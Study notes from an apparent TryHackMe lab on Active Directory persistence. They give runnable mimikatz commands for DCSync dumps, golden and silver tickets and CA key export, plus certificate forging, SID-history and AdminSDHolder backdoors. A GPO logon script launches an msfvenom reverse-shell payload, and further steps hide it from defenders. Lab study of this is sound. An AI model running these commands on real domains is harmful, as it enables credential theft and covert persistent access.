# Persisting Active Directory
> [TryHackMe Link](https://tryhackme.com/room/persistingad)

Assuming AD has been breached, enumerated and exploited to the furthest point and now need to establish persistence. 

## Persistence via Credentials

### DC Synchronisation
Domain Controllers are replicated across multiple DCs to achieve authentication across multiple locations. Each DC runs a process called Knowledge Consistency Checker (KCC) which generated a replication topology for the AD forest and automatically connects to other domain controllers through Remote Procedure Calls (RPC) to synchronise information. Including:
- Updating user password 
- New object creation (user)

Accounts such as those belonging to the Domain Admins groups can also do it for legitimate purposes such as creating a new domain controller. We can stage a DC sync attack to harvest credentials this way from a DC.

Not all crednetials are held equal and whilst dumping privileged credentials of members within the Domain Admins group is beneficial, these will be the first ones rotated by the blue team if compromise is discovered. Better to persist with near-privileged credentials: 
- **Credentials that have local administrator rights on several machines**. Usually, organisations have a group or two with local admin rights on almost all computers. These groups are typically divided into one for workstations and one for servers. 
- **Service accounts that have delegation permissions**. With these accounts, we would be able to force golden and silver tickets to perform Kerberos delegation attacks.
- **Accounts used for privileged AD services.** Compromise accounts of privileged services such as Exchange, Windows Server Update Services (WSUS), or System Center Configuration Manager (SCCM), to leverage AD exploitation to once again gain a privileged foothold.

To perform a DC Sync attack with mimikatz:
- single account:
  - `lsadump::dcsync /domain:DOMAIN /user:<Your low-privilege AD Username>`
  - Verify that the NTLM hash is correct by using a [website](https://codebeautify.org/ntlm-hash-generator) to transform your password into an NTLM hash
- all accounts:
  - `log <username>_dcdump.txt `
  - `lsadump::dcsync /domain:DOMAIN /all`
- Now either perform an offline password cracking attack to recover the plain text credentials or simply perform a pass the hash attack with Mimikatz

## Persistence via Tickets 

### Golden Tickets
These are forged TGTs meaning step 1 and 2 are bypassed and having a forged TGT of a privileged account means a TGS can be requested for any service. To forge this a KRBTGT account's password hash is needed to sign a TGT for any user account
- There is no need the password hash of the account we want to impersonate since we bypass that step. The TGT is only used to prove that the KDC on a DC signed it. Since it was signed by the KRBTGT hash, this verification passes and the TGT is declared valid no matter its contents.
- The KDC will only validate the user account specified in the TGT if it is older than 20 minutes. This means we can put a disabled, deleted, or non-existent account in the TGT, and it will be valid as long as we ensure the timestamp is not older than 20 minutes.
- The policies and rules for tickets are set in the TGT itself, we could overwrite the values pushed by the KDC. We could ensure that our TGT is valid for 10 years, granting persistence
- The KRBTGT account's password never changes, meaning once we have it, unless it is manually rotated, we have persistent access by generating TGTs forever. It would require rotation twice as current and previous passwords are kept valid
- Golden tickets would even allow you to bypass smart card authentication, since the smart card is verified by the DC before it creates the TGT.
- You can generate a golden ticket on any machine, even one that is not domain-joined (such as our own attack machine)

Apart from the KRBTGT account's password hash, we only need the domain name, domain , and user ID for the person we want to impersonate. To generate one with mimikatz we use: 
-  `kerberos::golden /admin:ReallyNotALegitAccount /domain:<DOMAIN> /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt`
   -  `/admin` - The username we want to impersonate. This does not have to be a valid user.
   -  `/domain` - The FQDN of the domain we want to generate the ticket for.
   -  `/id` -The user RID. By default, Mimikatz uses RID 500, which is the default Administrator account RID.
   -  `/sid` -The SID of the domain we want to generate the ticket for.
   -  `/krbtgt` -The NTLM hash of the KRBTGT account.
   -  `/endin` - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)
   -  `/renewmax` -The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
   -  `/ptt` - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.
- Verify the ticket using the dir command against the domain controller:
  - `C:\Users\Administrator.ZA>dir \\thmdc.za.tryhackme.loc\c$\`

### Silver Tickets
These are forged TGS tickets, skipping all communication we would have had with the KDC on the DC and only interface with the services we want to access directly. 
- Generated TGS is signed by the machine account of the host we are targeting.
- Only have access to the password hash of the machine account of the server we are attacking, we can only impersonate users on that host itself. The Silver Ticket's scope is limited to whatever service is targeted on the specific server.
- The DC is never contacted making the attack incredibly dangerous since the only available logs would be on the targeted server. So while the scope is more limited, it is significantly harder for the blue team to detect.
- Permissions are determined through SIDs, we can again create a non-existing user for our silver ticket, as long as we ensure the ticket has the relevant SIDs that would place the user in the host's local administrators group.
- The machine account's password is usually rotated every 30 days, which would not be good for persistence. However, we could leverage the access our TGS provides to gain access to the host's registry and alter the parameter that is responsible for the password rotation of the machine account.

To generate one with mimikatz we use: 
- `kerberos::golden /admin:StillNotALegitAccount /domain:<DOMAIN> /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt`
  - `/target` - The hostname of our target server (it can be any domain-joined host)
  - `/rc4` - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash. The $ indicates that it is a machine account.
  - `/service` - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.
- Verify that the silver ticket is working by running the dir command against the server running the service
  - `C:\Users\Administrator.ZA>dir \\thmserver1.za.tryhackme.loc\c$\`

### Forging tickets
The NTLM hash of the KRBTGT account, the NTLM hash of the machine, Domain SID will be required, these can be acquired with the `Get-ADDomain` command. 


## Persistence via Certificates

*The exploitation of most of these techniques would result in a full domain rebuild.*

Having a a valid certificate that can be used for Client Authentication allowing for the continous requesting of TGTs regardless of rotations until the certificate generated is revoked or expires. 

### Comprimising the CA
The private key of the CA is stored on the CA server and should be protected through hardware-based protection methods such as an **Hardware Security Module** (HSM), when using Active Directory Certificate Services (AD CS) for internal purposes and is protected by the machine **Data Protection API** (DPAPI).

Tools such as Mimikatz and SharpDPAPI can extract the CA certificate and thus the private key from the CA. Other tools can be seen [here](https://pentestlab.blog/2021/11/15/golden-certificate/)
1. `crypto::certificates /systemstore:local_machine`
   1.  see if we can view the certificates stored on the DC
2. Mimikatz allows us to patch memory to make these keys exportable
   1. `privilege::debug`
   2. `crypto::capi`
   3. `crypto::cng`
3. With these services patched, we can use Mimikatz to export the certificates
   1. `crypto::certificates /systemstore:local_machine /export`
4. Exported certificates will be stored in both `PFX` and `DER` format to disk
5. To export the private key, a password must be used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz

### Generating Certificates
With the private key and root CA certificate the SpectorOps [ForgeCert](https://github.com/GhostPack/ForgeCert) tool to forge a Client Authenticate certificate for any user we want: 
- `\ForgeCert.exe --CaCertPath <CERT_NAME.pfx> --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@<DOMAIN> --NewCertPath fullAdmin.pfx --NewCertPassword Password123 `
  - **CaCertPath** - The path to our exported CA certificate.
  - **CaCertPassword** - The password used to encrypt the certificate. By default, Mimikatz assigns the password of `mimikatz`.
  - **Subject** - The subject or common name of the certificate
  - **SubjectAltName** - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user
  - **NewCertPath** - The path to where ForgeCert will store the generated certificate.
  - **NewCertPassword** - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.

Use Rubeus to request a TGT using the certificate to verify that the certificate is trusted
- `Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:<DOMAIN> /dc:<IP of domain controller>`
  - `/user` - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
  - `/enctype` -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
  - `/certificate` - Path to the certificate we have generated
  - `/password` - The password for our certificate file
  - `/outfile` - The file where our TGT will be output to
  - `/domain` - The FQDN of the domain we are currently attacking
  - `/dc` - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running

use Mimikatz to load the TGT and authenticate to DC:
1. `kerberos::ptt administrator.kirbi`

### Prevention
The only way to remove the persistence is to issue a revocation of the certificate. This way it does not appear on AD CS's list of issued certificates, meaning the blue team will not be able to revoke our certificate. This way the root CA certificate must be revoked; but all certificates issued by AD CS would all of a sudden be invalid. Meaning they will have to generate a new certificate for every system that uses AD CS.

## Persistence via SID history
SIDs are used to track the security principal and the account's access when connecting to resources. SID history is to enable access for an account to effectively be cloned to another. This becomes useful when an organisation is busy performing an migration as it allows users to retain access to the original domain while they are being migrated to the new one. 

SID history is not restricted to only including SIDs from other domains. A SID of our current domain can be added to the SID history of an account we control. Notes on this techhnique:
- Normally require Domain Admin privileges or the equivalent thereof to perform this attack.
- When the account creates a logon event, the SIDs associated with the account are added to the user's token, which then determines the privileges associated with the account. This includes group SIDs.
- Injecting the Enterprise Admin SID since this would elevate the account's privileges to effective be Domain Admin in all domains in the forest.
- The SIDs are added to the user's token, privileges would be respected even if the account is not a member of the actual group. So you have all the permissions to compromise the entire domain but the account can simply be a normal user account with membership only to the Domain Users group.
  -  Using this account to alter the SID history of another account would hide the initial persistence vector

### Forging History
1. Check the low-privilege user does not currently have any information in their SID history
  1. `Get-ADUser <your ad username> -properties sidhistory,memberof`
2. Get the SID of the Domain Admins group since this is the group we want to add to our SID History
  1. `Get-ADGroup "Domain Admins"`
3. Use the [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file, the AD database where all information is stored
  1. `Stop-Service -Name ntds -force`
  2. `Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit `
  3. `Start-Service -Name ntds`
4. The NTDS database is locked when the NTDS service is running. In order to patch our SID history, we must first stop the service
  1. *You must restart the NTDS service after the patch, otherwise, authentication for the entire network will not work anymore*

## Persisting via Group Memberships

Privileged groups are monitored closesly for changes than any other, this includes Domain Admins or Enterprise Adminds which recieve additional security scrutiny. 
- The IT Support group can be used to gain privileges such as force changing user passwords (except for privileged users)
- Groups that provide local administrator rights are often not monitored as closely as protected groups. With local administrator rights to the correct hosts through group membership of a network support group
- Groups with indirect privileges, such as ownership over Group Policy Objects (GPOs), can be just as good for persistence.

### Nested Groups
Recursive groups are groups which are members of another group, also known as group nesting used to create more organised structure in AD. 
- IT Support Group may be made of multiple groups like Helpdesk, Access Card Managers, and Network Managers underneath this group. This way those groups can inherit the permissions of the IT Support Group
- While group nesting helps to organise AD, it does reduce the visibility of effective access. 

### Nesting Persistence
1. Creating a new base group which is hidden in the People->IT Organisational Unit
   1. `New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security`
2. Create another group in the People->Sales OU and add our previous group as a member
   1. `New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security `
   2. `Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"`
3. Add that group to the Domain Admins group
   1. `Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup2"`
4. Add our low-privileged AD user to the first group we created:
   1. `Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"`

This way we have a nested escalation of inherited privileges that are tougher to detect as the low privileged user is added to netgroup 1 which acquired Admin through its inheritance of netgroup 2 which itself inherited from the Domain Admins

## Persisting via AD Group Templates

Inject into the templates that generate the default groups and even if they remove our membership, we just need to wait until the template refreshes, and we will once again be granted membership.

One such template is the AdminSDHolder container. This container exists in every AD domain, and its Access Control List () is used as a template to copy permissions to all protected groups. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.
- A process called SDProp takes the ACL of the AdminSDHolder container and applies it to all protected groups every 60 minutes.
- Write an ACE that will grant us full permissions on all protected groups

### AdminSDHolder persistence
To deploy the persistence to the AdminSDHolder, we will use Microsoft Management Console (MMC):
1. Add the Users and Groups Snap-in (File->Add Snap-In->Active Directory Users and Computers). Make sure to enable Advanced Features (View->Advanced Features). We can find the AdminSDHolder group under Domain->System
2. Navigate to the Security of the group (Right-click->Properties->Security)
3. add our low-privileged user and grant Full Control

### SDProp
After 60 minutes our user will have full control over all Protected Groups. This is because the Security Descriptor Propagator (SDProp) service executes automatically every 60 minutes and will propagate this change to all Protected Groups.
- Although we have permissions to modify the groups, it does not automatically add us to the groups

> **Note**: If you really want to persist, you can grant full control to the Domain Users group in the AdminSDHolder group, which means any low-privileged user would be granted full control over all Protected Groups. Combining this with a full Sync means the blue team will have to reset every single credential in the domain to flush us out completely.

## Persistence via Group Policy Objects (GPOs)

Group Policy Management in AD provides a central mechanism to manage the local policy configuration of all domain-joined machines. This includes configuration such as membership to restricted groups, firewall and AV configuration, and which scripts should be executed upon startup.
- **Restricted Group Membership** - This could allow us administrative access to all hosts in the domain
- **Logon Script Deployment** - This will ensure that we get a shell callback every time a user authenticates to a host in the domain. 

With the second option we create a GPO that is linked to the Admins , which will allow us to get a shell on a host every time one of them authenticates to a host.
1. Before we can create the GPO. We first need to create our shell, listener
   1. `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe`
   2. Create a bat file with `copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe`
2. Get this script onto the machine in the SYSVOL directory 
3. Start the listener
   1. `msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"`
4. Use our Domain Admin account to open the Group Policy Management snap-in
   1. Enter MMC and click on File->Add/Remove Snap-in
   2. Select Group Policy Management snap-in and click Add
   3. This provides the GPO manager
5. Write a GPO that will be applied to all Admin
   1. right-click on the Admins OU and select Create a GPO in this domain
6. Right-click on your policy and select Enforced which ensures your policy will apply, even if there is a conflicting policy
7. Edit the GPO
   1. Under User Configuration, expand Policies->Windows Settings
   2. Select Scripts (Logon/Logoff)
   3. Right-click on Logon->Properties
   4. Click Add->Browse and select the batch file

### Hiding the persistence
Now that the persistence is confirmed it needs to be hidden: 
1. Open up MMC, click on the GPO and click Delegation
2. Right-Click on ENTERPRISE DOMAIN CONTROLLERS and select Edit settings, delete, modify security
3. Click on all other groups (except Authenticated Users) and click Remove
4. Click on Advanced and remove the Created Owner from the permissions

You can also replace Authenticated Users with Domain Computers to ensure that computers can still read and apply the policy, but prevent any user from reading the policy but may preven the callback to the shell working:
1. Click Add, Type Domain Computers, Click Check Names and OK
2. Select Read Permissions and OK
3. Click on Authenticated Users and click Remove

This ensures that even with the highest level of permissions, the blue team would not be able to remove our GPO unless they impersonated the machine account of a Domain Controller.


## Additional Techniques
After each round of lateral movement and privilege escalation, persistence should be deployed.
- [Skeleton keys](https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/skeleton-key-attack/) - Using Mimikatz, we can deploy a skeleton key. This default password can be used to impersonate any account in the domain.
- [Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714) - Domain controllers have an internal break glass administrator account called the DSRM account. This password is set when the server is promoted to a DC and is seldom changed. This password is used in cases of emergencies to recover the DC. An attacker can extract this password using Mimikatz and use this password to gain persistent administrative access to domain controllers in the environment
- [Malicious Security Support Provider (SSP)](https://adsecurity.org/?p=1760) - We can add Mimikatz's mimilib as an SSP that would log all credentials of authentication attempts to a file. We can specify a network location for logging, which would allow mimilib to send us credentials as users authenticate to the compromised host, providing persistence.
- [Computer Accounts](https://adsecurity.org/?p=2753) - The passwords for machine accounts are normally rotated every 30 days. However, we can alter the password of a machine account which would stop the automatic rotation. Together with this, we can grant the machine account administrative access to other machines. This will allow us to use the computer account as a normal account, with the only sign of the persistence being the fact that the account has administrative rights over other hosts, which is often normal behaviour in AD, so that it may go undetected.

## Mitigation
The persistence can be so deeply rooted that a complete domain rebuild is required. However, there are a couple of things that we can do to detect deployed persistence:
- Anomalous account logon events are the most common alert for persistence. Any time credentials break the tiering model, it can be as a result of persistence
- Dpecific detection rules can be written, such as cases when a machine account's password changes, ACLs are permissively updated, or new GPOs are created
- Protect privileged resources. Although low privileged access can be used to deploy persistence, the truly scary techniques only become available once an attacker has acquired privileged access to the domain.